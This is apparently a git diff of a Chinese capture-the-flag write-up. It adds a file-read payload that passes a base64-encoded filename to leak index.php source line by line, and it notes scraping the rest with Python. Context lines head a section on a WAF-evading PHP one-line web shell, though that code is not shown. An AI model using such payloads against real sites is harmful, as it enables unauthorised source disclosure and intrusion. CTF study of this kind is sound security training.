@@ -403,7 +403,11 @@ base64 解码得到 key.txt
 猜测可以通过这个方法得到 index.php 的源码
 line 变量就是当前文件的行数
 filename 变量就是要读取的文件,不过要 base64 加密
-构造 payload:`
+构造 payload:`?line=2&filename=aW5kZXgucGhw` 
+得到 index.php 源码第 2 行
+如法炮制 Python 扒取全部源码
+```py
+
 ## 过狗一句话
 ```php
 <?php 
@@ -428,7 +432,7 @@ explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyMDUzODI1ODEsMTg2MjIyMTY1MywtMT
+eyJoaXN0b3J5IjpbLTE4OTY2Mjc3MDEsMTg2MjIyMTY1MywtMT
 E2MjQ5NTg4NCwxNjY0OTY3MTQ2LC0xODUzNzYzODQ4LC03OTkx
 MzIyNzIsLTE5NDkxNzMzMTgsNzk1NzE1NjI1LDQ1NDEyNTYyMy
 wtMTE3NzQwNzk0NiwtNzc5NjM0Nzg0LC02NDU3Nzk2MDYsMTQw
